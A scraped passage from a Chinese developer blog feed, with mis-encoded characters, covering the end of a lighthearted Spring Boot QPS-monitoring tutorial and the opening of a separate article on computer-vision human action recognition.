    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>io.micrometer<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>micrometer-core<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>io.micrometer<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>micrometer-registry-prometheus<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-actuator<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
</code></pre>
<ol>
<li><strong>é…ç½®application.yml</strong>ï¼š</li>
</ol>

<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">management:</span>
  <span class="hljs-attr">endpoints:</span>
    <span class="hljs-attr">web:</span>
      <span class="hljs-attr">exposure:</span>
        <span class="hljs-attr">include:</span> <span class="hljs-string">health,info,metrics,prometheus</span>
  <span class="hljs-attr">metrics:</span>
    <span class="hljs-attr">export:</span>
      <span class="hljs-attr">prometheus:</span>
        <span class="hljs-attr">enabled:</span> <span class="hljs-literal">true</span>
    <span class="hljs-attr">tags:</span>
      <span class="hljs-attr">application:</span> <span class="hljs-string">${spring.application.name}</span>
  <span class="hljs-attr">endpoint:</span>
    <span class="hljs-attr">metrics:</span>
      <span class="hljs-attr">enabled:</span> <span class="hljs-literal">true</span>
</code></pre>
<ol>
<li><strong>è®¿é—®ç›‘æ§æ•°æ®</strong>ï¼š</li>
</ol>

<pre><code class="hljs language-bash" lang="bash">http://localhost:8080/actuator/metrics  <span class="hljs-comment"># æŸ¥çœ‹æ‰€æœ‰æŒ‡æ ‡</span>
http://localhost:8080/actuator/prometheus  <span class="hljs-comment"># Prometheusæ ¼å¼</span>
</code></pre>
<h3 data-id="heading-8">æ–¹æ¡ˆ3å®æ–½æ­¥éª¤ï¼ˆè±ªåç‰ˆï¼‰ï¼š</h3>
<ol>
<li><strong>æ­å»ºSpring Boot Admin Server</strong>ï¼š</li>
</ol>

<pre><code class="hljs language-less" lang="less"><span class="hljs-variable">@SpringBootApplication</span>
<span class="hljs-variable">@EnableAdminServer</span>
public class AdminServerApplication {
    <span class="hljs-selector-tag">public</span> <span class="hljs-selector-tag">static</span> <span class="hljs-selector-tag">void</span> <span class="hljs-selector-tag">main</span>(String[] args) {
        <span class="hljs-selector-tag">SpringApplication</span><span class="hljs-selector-class">.run</span>(AdminServerApplication.class, args);
        <span class="hljs-selector-tag">System</span><span class="hljs-selector-class">.out</span><span class="hljs-selector-class">.println</span>(<span class="hljs-string">"ç›‘æ§å¤§å±å·²å°±ä½ï¼Œé™›ä¸‹è¯·æ£€é˜…ï¼"</span>);
    }
}
</code></pre>
<ol>
<li><strong>å®¢æˆ·ç«¯é…ç½®</strong>ï¼šå¦‚ä¸Šæ–‡ymlé…ç½®</li>
<li><strong>è®¿é—®Admin UI</strong>ï¼š<code>http://localhost:9090</code></li>
</ol>
<h2 data-id="heading-9">å››ã€QPSç»Ÿè®¡çš„è¿›é˜¶æŠ€å·§</h2>
<h3 data-id="heading-10">1. æ»‘åŠ¨çª—å£ç»Ÿè®¡ï¼ˆæœ€è¿‘Nç§’çš„QPSï¼‰</h3>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SlidingWindowQpsCounter</span> {
    <span class="hljs-comment">// ç”¨ç¯å½¢é˜Ÿåˆ—å®ç°æ»‘åŠ¨çª—å£</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> LinkedList&lt;Long&gt; timestamps = <span class="hljs-keyword">new</span> LinkedList&lt;&gt;();
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> windowSeconds;
    
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">SlidingWindowQpsCounter</span><span class="hljs-params">(<span class="hljs-type">int</span> windowSeconds)</span> </span>{
        <span class="hljs-keyword">this</span>.windowSeconds = windowSeconds;
        log.<span class="hljs-built_in">info</span>(<span class="hljs-string">"åˆ›å»ºæ»‘åŠ¨çª—å£ç›‘æ§ï¼Œçª—å£å¤§å°ï¼š{}ç§’"</span>, windowSeconds);
    }
    
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-type">void</span> <span class="hljs-title">hit</span><span class="hljs-params">()</span> </span>{
        <span class="hljs-type">long</span> now = System.<span class="hljs-built_in">currentTimeMillis</span>();
        timestamps.<span class="hljs-built_in">add</span>(now);
        <span class="hljs-comment">// ç§»é™¤çª—å£å¤–çš„è®°å½•</span>
        <span class="hljs-keyword">while</span> (!timestamps.<span class="hljs-built_in">isEmpty</span>() &amp;&amp; 
               now - timestamps.<span class="hljs-built_in">getFirst</span>() &gt; windowSeconds * <span class="hljs-number">1000</span>) {
            timestamps.<span class="hljs-built_in">removeFirst</span>();
        }
    }
    
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-type">double</span> <span class="hljs-title">getQps</span><span class="hljs-params">()</span> </span>{
        <span class="hljs-keyword">return</span> timestamps.<span class="hljs-built_in">size</span>() / (<span class="hljs-type">double</span>) windowSeconds;
    }
}
</code></pre>
<h3 data-id="heading-11">2. åˆ†ä½æ•°ç»Ÿè®¡ï¼ˆP90/P95/P99å“åº”æ—¶é—´ï¼‰</h3>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-keyword">@Bean</span>
public MeterRegistryCustomizer&lt;MeterRegistry&gt; addQuantiles() {
    return registry -&gt; {
        DistributionStatisticConfig config = DistributionStatisticConfig<span class="hljs-selector-class">.builder</span>()
                <span class="hljs-selector-class">.percentiles</span>(<span class="hljs-number">0.5</span>, <span class="hljs-number">0.9</span>, <span class="hljs-number">0.95</span>, <span class="hljs-number">0.99</span>)  <span class="hljs-comment">// 50%, 90%, 95%, 99%</span>
                <span class="hljs-selector-class">.percentilePrecision</span>(<span class="hljs-number">2</span>)
                <span class="hljs-selector-class">.build</span>();
        
        registry<span class="hljs-selector-class">.config</span>()<span class="hljs-selector-class">.meterFilter</span>(
            new MeterFilter() {
                <span class="hljs-keyword">@Override</span>
                public DistributionStatisticConfig configure(
                    Meter.Id id, DistributionStatisticConfig config) {
                    if (id.getName()<span class="hljs-selector-class">.contains</span>(".timer")) {
                        return config<span class="hljs-selector-class">.merge</span>(DistributionStatisticConfig.builder()
                                <span class="hljs-selector-class">.percentiles</span>(<span class="hljs-number">0.5</span>, <span class="hljs-number">0.9</span>, <span class="hljs-number">0.95</span>, <span class="hljs-number">0.99</span>)
                                <span class="hljs-selector-class">.build</span>());
                    }
                    return config;
                }
            }
        );
        
        log<span class="hljs-selector-class">.info</span>("åˆ†ä½æ•°ç»Ÿè®¡å·²å¯ç”¨ï¼Œå‡†å¤‡ç²¾å‡†æ‰“å‡»æ…¢æŸ¥è¯¢ï¼");
    };
}
</code></pre>
<h3 data-id="heading-12">3. åŸºäºQPSçš„è‡ªåŠ¨ç†”æ–­</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Component</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AdaptiveCircuitBreaker</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">volatile</span> <span class="hljs-type">boolean</span> <span class="hljs-variable">circuitOpen</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;
    <span class="hljs-keyword">private</span> <span class="hljs-type">double</span> <span class="hljs-variable">currentQps</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
    
    <span class="hljs-meta">@Scheduled(fixedRate = 1000)</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">monitorAndAdjust</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// è·å–å½“å‰QPS</span>
        currentQps = calculateCurrentQps();
        
        <span class="hljs-keyword">if</span> (circuitOpen &amp;&amp; currentQps &lt; <span class="hljs-number">100</span>) {
            circuitOpen = <span class="hljs-literal">false</span>;
            log.info(<span class="hljs-string">"ç†”æ–­å™¨å…³é—­ï¼Œç³»ç»Ÿæ¢å¤ä¾›ç”µï¼å½“å‰QPS: {}"</span>, currentQps);
        } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!circuitOpen &amp;&amp; currentQps &gt; <span class="hljs-number">1000</span>) {
            circuitOpen = <span class="hljs-literal">true</span>;
            log.error(<span class="hljs-string">"ç†”æ–­å™¨è§¦å‘ï¼QPSè¿‡é«˜: {}ï¼Œç³»ç»Ÿè¿›å…¥ä¿æŠ¤æ¨¡å¼"</span>, currentQps);
        }
        
        <span class="hljs-comment">// åŠ¨æ€è°ƒæ•´çº¿ç¨‹æ± å¤§å°</span>
        adjustThreadPool(currentQps);
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">adjustThreadPool</span><span class="hljs-params">(<span class="hljs-type">double</span> qps)</span> {
        <span class="hljs-type">int</span> <span class="hljs-variable">suggestedSize</span> <span class="hljs-operator">=</span> (<span class="hljs-type">int</span>) (qps * <span class="hljs-number">0.5</span>);  <span class="hljs-comment">// ç»éªŒå…¬å¼</span>
        log.debug(<span class="hljs-string">"å»ºè®®çº¿ç¨‹æ± å¤§å°è°ƒæ•´ä¸º: {} (åŸºäºQPS: {})"</span>, suggestedSize, qps);
    }
}
</code></pre>
<h2 data-id="heading-13">äº”ã€æ€»ç»“ï¼šç»™ç³»ç»ŸåšQPSç›‘æ§å°±åƒ...</h2>
<h3 data-id="heading-14">1. <strong>ä¸ºä»€ä¹ˆè¦ç›‘æ§QPSï¼Ÿ</strong></h3>
<ul>
<li><strong>å¯¹ç³»ç»Ÿ</strong>ï¼šå°±åƒç»™æ±½è½¦è£…æ—¶é€Ÿè¡¨ï¼Œè¶…é€Ÿäº†ä¼šæŠ¥è­¦</li>
<li><strong>å¯¹å¼€å‘</strong>ï¼šå°±åƒç»™ç¨‹åºå‘˜è£…"å¥åº·æ‰‹ç¯"ï¼Œä»£ç è·‘å¤ªå¿«ä¼šå†’çƒŸ</li>
<li><strong>å¯¹è€æ¿</strong>ï¼šå°±åƒç»™å…¬å¸è£…"ä¸šç»©å¤§å±"ï¼Œæ•°å­—å¥½çœ‹å¿ƒæƒ…å¥½</li>
</ul>
<h3 data-id="heading-15">2. <strong>å„æ–¹æ¡ˆé€‰æ‹©å»ºè®®</strong>ï¼š</h3>
<ul>
<li><strong>åˆåˆ›å…¬å¸/å°é¡¹ç›®</strong>ï¼šç”¨æ–¹æ¡ˆ1ï¼Œç®€å•ç²—æš´è§æ•ˆå¿«ï¼Œå°±åƒ"åˆ›å¯è´´"</li>
<li><strong>ä¸­å‹é¡¹ç›®/å¾®æœåŠ¡</strong>ï¼šç”¨æ–¹æ¡ˆ2ï¼Œå…¨é¢ä½“æ£€ä¸é—æ¼ï¼Œå°±åƒ"å¹´åº¦ä½“æ£€"</li>
<li><strong>å¤§å‹åˆ†å¸ƒå¼ç³»ç»Ÿ</strong>ï¼šç”¨æ–¹æ¡ˆ3ï¼Œå…¨æ™¯ç›‘æ§æ— æ­»è§’ï¼Œå°±åƒ"å«æ˜Ÿç›‘æ§"</li>
</ul>
<h3 data-id="heading-16">3. <strong>æœ€ä½³å®è·µæé†’</strong>ï¼š</h3>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-comment">// è®°ä½è¿™äº›é»„é‡‘æ³•åˆ™ï¼š</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">QpsGoldenRules</span> {
    <span class="hljs-comment">// æ³•åˆ™1ï¼šç›‘æ§ä¸æ˜¯ä¸ºäº†ç›‘æ§è€Œç›‘æ§</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> RULE_1 = <span class="hljs-string">"åˆ«è®©ç›‘æ§æŠŠç³»ç»Ÿå‹å®äº†ï¼"</span>;
    
    <span class="hljs-comment">// æ³•åˆ™2ï¼šå‘Šè­¦è¦æœ‰æ„ä¹‰</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> RULE_2 = <span class="hljs-string">"ç‹¼æ¥äº†å–Šå¤šäº†ï¼Œå°±æ²¡äººä¿¡äº†ï¼"</span>;
    
    <span class="hljs-comment">// æ³•åˆ™3ï¼šæ•°æ®è¦å¯è§†åŒ–</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> RULE_3 = <span class="hljs-string">"è€æ¿çœ‹ä¸æ‡‚çš„å›¾è¡¨éƒ½æ˜¯åºŸçº¸ï¼"</span>;
    
    <span class="hljs-comment">// æ³•åˆ™4ï¼šè¦æœ‰åº”å¯¹æ–¹æ¡ˆ</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> RULE_4 = <span class="hljs-string">"å…‰æŠ¥è­¦ä¸è§£å†³ï¼Œè¦ä½ æœ‰ä½•ç”¨ï¼Ÿ"</span>;
}
</code></pre>
<h3 data-id="heading-17">4. <strong>æœ€åæ€»ç»“</strong>ï¼š</h3>
<p>ç»™ä½ çš„ç³»ç»ŸåŠ QPSç›‘æ§ï¼Œå°±åƒæ˜¯ï¼š</p>
<ul>
<li><strong>ç»™å¤–å–å°å“¥é…äº†è®¡æ­¥å™¨</strong> â€”â€” çŸ¥é“ä»–æ¯å¤©è·‘å¤šå°‘</li>
<li><strong>ç»™ç¨‹åºå‘˜è£…äº†é”®ç›˜è®¡æ•°å™¨</strong> â€”â€” çŸ¥é“ä»–æœ‰å¤šå·</li>
<li><strong>ç»™ç³»ç»Ÿè£…äº†"å¿ƒç”µå›¾æœº"</strong> â€”â€” éšæ—¶æŒæ¡ç”Ÿå‘½ä½“å¾</li>
</ul>
<p>è®°ä½ï¼Œä¸€ä¸ªå¥åº·çš„ç³»ç»Ÿåº”è¯¥ï¼š</p>
<ul>
<li>å¹³æ—¶ <strong>å¿ƒè·³å¹³ç¨³</strong>ï¼ˆQPSç¨³å®šï¼‰</li>
<li>å¤§ä¿ƒæ—¶ <strong>é€‚å½“å…´å¥‹</strong>ï¼ˆå¼¹æ€§æ‰©å®¹ï¼‰</li>
<li>æ•…éšœæ—¶ <strong>è‡ªåŠ¨é™å‹</strong>ï¼ˆç†”æ–­é™çº§ï¼‰</li>
</ul>
<p>ç°åœ¨å°±å»ç»™ä½ çš„SpringBootç³»ç»Ÿè£…ä¸Š"æ™ºèƒ½æ‰‹ç¯"å§ï¼è®©å®ƒåœ¨ä»£ç çš„æµ·æ´‹é‡Œï¼Œæ¸¸å¾—æ›´å¿«ã€æ›´ç¨³ã€æ›´å¥åº·ï¼</p>
<p><strong>æœ€åçš„æœ€å</strong>ï¼šç›‘æ§åƒä¸‡æ¡ï¼Œç¨³å®šç¬¬ä¸€æ¡ï¼›QPSä¸è§„èŒƒï¼Œè¿ç»´ä¸¤è¡Œæ³ªï¼</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/145930fb74f74197af4b3ec3f190de01~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oKf56m656CB5a2X:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765934424&amp;x-signature=qek89Vz2xpa2rLHWI83HaeDzmG0%3D" alt="SpringBoot å®ç°QPSç›‘æ§ï¼šåˆ«ç­‰ç³»ç»Ÿâ€œå’³è¡€â€äº†æ‰æƒ³èµ·è£…â€œå¿ƒç”µå›¾â€ï¼.png" loading="lazy"/></p>
<p><strong>è°¢è°¢ä½ çœ‹æˆ‘çš„æ–‡ç« ï¼Œæ—¢ç„¶çœ‹åˆ°è¿™é‡Œäº†ï¼Œå¦‚æœè§‰å¾—ä¸é”™ï¼Œéšæ‰‹ç‚¹ä¸ªèµã€è½¬å‘ã€åœ¨çœ‹ä¸‰è¿å§ï¼Œæ„Ÿè°¢æ„Ÿè°¢ã€‚é‚£æˆ‘ä»¬ï¼Œä¸‹æ¬¡å†è§ã€‚</strong></p>
<p>æ‚¨çš„ä¸€é”®ä¸‰è¿ï¼Œæ˜¯æˆ‘æ›´æ–°çš„æœ€å¤§åŠ¨åŠ›ï¼Œè°¢è°¢</p>
<p>å±±æ°´æœ‰ç›¸é€¢ï¼Œæ¥æ—¥çš†å¯æœŸï¼Œè°¢è°¢é˜…è¯»ï¼Œæˆ‘ä»¬å†ä¼š</p>
<p>æˆ‘æ‰‹ä¸­çš„é‡‘ç®æ£’ï¼Œä¸Šèƒ½é€šå¤©ï¼Œä¸‹èƒ½æ¢æµ·</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[AIçœŸèƒ½çœ‹æ‡‚ä½ åœ¨åšä»€ä¹ˆå—ï¼Ÿè®¡ç®—æœºè§†è§‰å¦‚ä½•é©±åŠ¨äººç±»åŠ¨ä½œè¯†åˆ«]]></title>    <link>https://juejin.cn/post/7581752787563872296</link>    <guid>https://juejin.cn/post/7581752787563872296</guid>    <pubDate>2025-12-10T01:59:29.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581752787563872296" data-draft-id="7581752787563823144" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="AIçœŸèƒ½çœ‹æ‡‚ä½ åœ¨åšä»€ä¹ˆå—ï¼Ÿè®¡ç®—æœºè§†è§‰å¦‚ä½•é©±åŠ¨äººç±»åŠ¨ä½œè¯†åˆ«"/> <meta itemprop="keywords" content="ç®—æ³•,è®¡ç®—æœºè§†è§‰,æ·±åº¦å­¦ä¹ "/> <meta itemprop="datePublished" content="2025-12-10T01:59:29.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="CoovallyAIHub"/> <meta itemprop="url" content="https://juejin.cn/user/2461151071843739"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            AIçœŸèƒ½çœ‹æ‡‚ä½ åœ¨åšä»€ä¹ˆå—ï¼Ÿè®¡ç®—æœºè§†è§‰å¦‚ä½•é©±åŠ¨äººç±»åŠ¨ä½œè¯†åˆ«
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2461151071843739/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    CoovallyAIHub
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-10T01:59:29.000Z" title="Wed Dec 10 2025 01:59:29 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-10
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»10åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>æ—¥å¸¸ç”Ÿæ´»ä¸­å……æ»¡äº†æˆ‘ä»¬å¾ˆå°‘ç•™æ„çš„å°åŠ¨ä½œã€‚ç©¿è¿‡æˆ¿é—´ã€ååœ¨æ¡Œå‰ã€å‘æœ‹å‹æŒ¥æ‰‹ï¼Œè¿™äº›å¯¹æˆ‘ä»¬æ¥è¯´è½»è€Œæ˜“ä¸¾ï¼Œä½†ç”¨äººå·¥æ™ºèƒ½æ¥è¯†åˆ«å´è¿œæ²¡æœ‰è¿™ä¹ˆç®€å•ã€‚å¯¹äººç±»æ¥è¯´è‡ªç„¶è€Œç„¶çš„äº‹æƒ…ï¼Œåœ¨æœºå™¨è¯•å›¾ç†è§£æ—¶å°±å˜å¾—å¤æ‚å¾—å¤šã€‚</p>
<p>è¿™ç§èƒ½åŠ›è¢«ç§°ä¸ºäººç±»åŠ¨ä½œè¯†åˆ«ï¼ˆHARï¼‰ï¼Œå®ƒè®©è®¡ç®—æœºèƒ½å¤Ÿæ£€æµ‹å¹¶è§£è¯»äººç±»è¡Œä¸ºä¸­çš„æ¨¡å¼ã€‚å¥èº«åº”ç”¨å°±æ˜¯HARçš„ä¸€ä¸ªå…¸å‹ä¾‹å­â€”â€”é€šè¿‡è¿½è¸ªæ­¥æ•°å’Œé”»ç‚¼è§„å¾‹ï¼Œå®ƒå±•ç¤ºäº†AIå¦‚ä½•ç›‘æµ‹æ—¥å¸¸æ´»åŠ¨ã€‚</p>
<p>çœ‹åˆ°äº†HARçš„æ½œåŠ›ï¼Œè®¸å¤šè¡Œä¸šå·²å¼€å§‹é‡‡ç”¨è¿™é¡¹æŠ€æœ¯ã€‚äº‹å®ä¸Šï¼Œé¢„è®¡åˆ°2033å¹´ï¼Œäººç±»åŠ¨ä½œè¯†åˆ«å¸‚åœºè§„æ¨¡å°†è¶…è¿‡125.6äº¿ç¾å…ƒã€‚</p>
<p>è¿™ä¸€è¿›å±•å¾ˆå¤§ç¨‹åº¦ä¸Šå¾—ç›Šäºè®¡ç®—æœºè§†è§‰çš„æ¨åŠ¨ã€‚ä½œä¸ºäººå·¥æ™ºèƒ½çš„ä¸€ä¸ªåˆ†æ”¯ï¼Œå®ƒè®©æœºå™¨èƒ½å¤Ÿåˆ†æå›¾åƒã€è§†é¢‘ç­‰è§†è§‰æ•°æ®ã€‚å€ŸåŠ©è®¡ç®—æœºè§†è§‰å’Œå›¾åƒè¯†åˆ«æŠ€æœ¯ï¼ŒHARå·²ä»ä¸€ä¸ªç ”ç©¶æ¦‚å¿µï¼Œå‘å±•æˆä¸ºå‰æ²¿AIåº”ç”¨ä¸­å®ç”¨è€Œä»¤äººå…´å¥‹çš„ä¸€éƒ¨åˆ†ã€‚</p>
<p>æœ¬æ–‡å°†æ¢è®¨ä»€ä¹ˆæ˜¯HARï¼Œè¯†åˆ«äººç±»åŠ¨ä½œçš„ä¸åŒæ–¹æ³•ï¼Œä»¥åŠè®¡ç®—æœºè§†è§‰å¦‚ä½•å¸®åŠ©æˆ‘ä»¬å›ç­”è¿™ä¸ªé—®é¢˜ï¼šAIèƒ½å¦åœ¨çœŸå®åœºæ™¯ä¸­æ£€æµ‹äººç±»åŠ¨ä½œï¼Ÿè®©æˆ‘ä»¬å¼€å§‹å§ï¼</p>
<h2 data-id="heading-0"><strong>ä»€ä¹ˆæ˜¯äººç±»åŠ¨ä½œè¯†åˆ«ï¼Ÿ</strong></h2>
